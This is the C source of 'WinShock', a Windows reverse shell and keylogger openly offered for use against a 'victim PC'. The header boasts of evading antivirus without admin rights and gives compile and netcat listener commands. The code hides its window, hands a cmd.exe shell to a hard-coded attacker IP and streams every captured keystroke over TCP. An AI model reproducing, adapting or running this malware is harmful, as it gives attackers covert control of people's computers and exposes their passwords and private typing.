/*
*  @idigitalflame
*
*  WinShock
*  ====================
*  Basic windows reverse shell/backdoor and keylogger.
*  Dosen't require admin rights and so far (2/27/16) is not detected by any AV :)
*  I will update as I go with this
*
*  Edit the "SERVER_PORT" and  "SERVER_KEY_PORT" ints for setting the TCP stream shell and keylogger
*  Edit the "SERVER_ADDRESS" for the receiving server.
*
*  Creates a basic cmd shell and keylogger when started, auto hides.
*  Key log data and shell are streamed over un-encrypted TCP.
*  Accepts 2-3 cmd params if you want to change shell address/port on the fly
*    winshock.exe <ip> <cmd_port> <keylog_port>
*      You can omit keylog_port if you want.
*
*  How to use:
*    Compile, Spawn listener on selected ports for shell and keylog (443 and 80 by default).
*    Netcat is easy (ex nc -l -p 443; nc -l -p 80
*    Run on victim PC, and bam! shell access and keys!  Dosen't need admin rights.
*
*  TODO:
*   -Replace TCP keylogger with UDP replacement over 53/123 possibly.
*   -Add encryption to TCP stream.
*
*  How to compile
*    Please use MinGW, it works better than Cygwin.
*    Compile with "gcc WinShock.c -o exefile.exe -lws2_32"
*/

#define _WIN32_WINNT 0x0500

#include <time.h>
#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <winuser.h>
#include <windowsx.h>
#include <winsock2.h>

#pragma comment(lib, "Ws2_32.lib")

#define SERVER_PORT 443
#define SERVER_KEY_PORT 80
#define COMMAND_ONLY 0 // If set to 0, gets a non-existant pid and can execute but not read executed commands
						 // Created processes may be visible to the user
#define ENABLE_KEYLOG 1 // Set to 0 for no keylogging, dissapears instantly and spawns a non existent pid :)
#define SERVER_ADDRESS "10.100.101.17"

WSADATA wsaData;
SOCKET skel_sock;
char skel_addr[16];
STARTUPINFO skel_child;
struct sockaddr_in socket_info;
PROCESS_INFORMATION skel_child_info;

int scan_keys(char* address, short port);
int sock_write(SOCKET sock, char* sock_data);
int sock_writec(SOCKET sock, char sock_data);
SOCKET sock_connect(char* address, short port);

int scan_keys(char* address, short port)
{
	SOCKET key_sock;
	short key, ret;
	key_sock = sock_connect(address, port);
	if(key_sock == -1)
		return 1;
	sock_write(key_sock, "Connected to WinShock Keylogger v0.1 Alpha!\nHave Fun!\n");
    while(1)
    {
    	Sleep(20);
        for(key = 8; key <= 222; key++)
        {
        	ret = GetAsyncKeyState(key);
        	if(ret == -32767 || ret == 1)
            {
                if((key >= 32) && (key <= 64))
                {
                    sock_writec(key_sock, (char)key);
                    break;
                }        
                else if((key > 64) && (key < 97))
                {
                    key += 32;
                    sock_writec(key_sock, (char)key);
                    break;
                }
                else
                {
                	switch(key)
                    {
                    	case VK_RSHIFT:
                    		sock_write(key_sock, "[SHIFT]");
                            break; 
                        case VK_LSHIFT:
                    		sock_write(key_sock, "[SHIFT]");
                            break; 
                    	case VK_SPACE:
                        	sock_writec(key_sock, ' ');
                            break;    
                        case VK_SHIFT:
                            sock_write(key_sock, "[SHIFT]");
                            break;                                            
                        case VK_RETURN:
                            sock_write(key_sock, "[ENTER]\n");
                            break;
                        case VK_BACK:
                           	sock_write(key_sock, "[BACKSPACE]");
                            break;
                        case VK_TAB:
                            sock_write(key_sock, "[TAB]");
                            break;
                        case VK_CONTROL:
                            sock_write(key_sock, "[CTRL]");
                            break;    
                        case VK_DELETE:
                            sock_write(key_sock, "[DEL]");
                            break;
                        case VK_CAPITAL:
                        	sock_write(key_sock, "[CAPS]");
                            break; 
                        case VK_OEM_1:
                            sock_write(key_sock, "[ ;: ]");
                            break;
                        case VK_OEM_2:
                            sock_write(key_sock, "[ /? ]");
                            break;
                        case VK_OEM_3:
                            sock_write(key_sock, "[ `~ ]");
                            break;
                        case VK_OEM_4:
                            sock_write(key_sock, "[ [{ ]");
                            break;
                        case VK_OEM_5:
                            sock_write(key_sock, "[ \\| ]");
                            break;                                
                        case VK_OEM_6:
                            sock_write(key_sock, "[ }] ]");
                        case VK_OEM_7:
                            sock_writec(key_sock, '\\');
                            break;
                        case 0xBB:
                            sock_writec(key_sock, '+');
                            break;
                        case 0xBC:
                            sock_writec(key_sock, ',');
                            break;
                        case 0xBD:
                            sock_writec(key_sock, '-');
                            break;
                        case 0xBE:
                            sock_writec(key_sock, '.');
                            break;
                        case VK_NUMPAD0:
                            sock_writec(key_sock, '0');
                           	break;
                        case VK_NUMPAD1:
                            sock_writec(key_sock, '1');
                            break;
                        case VK_NUMPAD2:
                            sock_writec(key_sock, '2');
                            break;
                        case VK_NUMPAD3:
                            sock_writec(key_sock, '3');
                            break;
                        case VK_NUMPAD4:
                            sock_writec(key_sock, '4');
                            break;
                        case VK_NUMPAD5:
                            sock_writec(key_sock, '5');
                            break;
                        case VK_NUMPAD6:
                            sock_writec(key_sock, '6');
                           	break;
                        case VK_NUMPAD7:
                            sock_writec(key_sock, '7');
                            break;
                        case VK_NUMPAD8:
                            sock_writec(key_sock, '8');
                            break;
                        case VK_NUMPAD9:
                            sock_writec(key_sock, '9');
                            break;
                        default:
                            break;
                    }
                }
            }   
		}
    }
    return 0;
}

int sock_writec(SOCKET sock, char sock_data)
{
	char mesg[1];
	mesg[0] = sock_data;
	if(send(sock, mesg, 1, 0) < 0)
	{
		WSACleanup();
		return 0;
	}
	return 1;
}

int sock_write(SOCKET sock, char* sock_data)
{
	if(send(sock, sock_data, strlen(sock_data), 0) < 0)
	{
		WSACleanup();
		return 0;
	}
	return 1;
}

SOCKET sock_connect(char* address, short port)
{
	WSADATA wsaData;
	SOCKET con_sock;
	struct sockaddr_in con_socket_info;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	con_sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL);
	con_socket_info.sin_family = AF_INET;
  	con_socket_info.sin_port = htons(port);
  	con_socket_info.sin_addr.s_addr = inet_addr(address);
	if(skel_sock == INVALID_SOCKET)
	{
		WSACleanup();
		return -1;
	}
	if(WSAConnect(con_sock, (SOCKADDR*)&con_socket_info, sizeof(con_socket_info), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
	{
		WSACleanup();
		return -1;
	}
	return con_sock;
}

int main(int argc, char *argv[])
{
	HWND skel_window = GetConsoleWindow();
    ShowWindow(skel_window, SW_MINIMIZE);
    ShowWindow(skel_window, SW_HIDE);
	short skel_port, skel_key_port;
	memset(&skel_addr[0], 0, sizeof(skel_addr));
	skel_port = SERVER_PORT;
	skel_key_port = SERVER_KEY_PORT;
	if(argc >= 3)
	{
		skel_port = atoi(argv[2]);
		strncpy(skel_addr, argv[1], strlen(argv[1]));
		if(argc == 4)
			skel_key_port = atoi(argv[3]);
	}
	else
		strncpy(skel_addr, SERVER_ADDRESS, sizeof(SERVER_ADDRESS));
	skel_sock = sock_connect(skel_addr, skel_port);
	if(skel_sock == -1)
		return 1;
	sock_write(skel_sock, "Connected to WinShock Shell v0.1 Alpha!\nOpening Key logger on port ");
	char skel_port_msg[5];
	sprintf(skel_port_msg, "%u!", (skel_port+1));
	sock_write(skel_sock, skel_port_msg);
	sock_write(skel_sock, ", Have Fun!\n");
	memset(&skel_child, 0, sizeof(skel_child));
	skel_child.cb = sizeof(skel_child);
	skel_child.dwFlags = STARTF_USESTDHANDLES;
	skel_child.hStdInput = skel_child.hStdOutput = skel_child.hStdError = (HANDLE)skel_sock;
	int skel_set = 0;
	if(COMMAND_ONLY)
		skel_set = 0x00000008;
	if(CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, skel_set, NULL, NULL, &skel_child, &skel_child_info) == 0)
	{
		WSACleanup();
		return 1;
	}
	if(ENABLE_KEYLOG == 1)
		scan_keys(skel_addr, skel_key_port);
	return 0; 
}
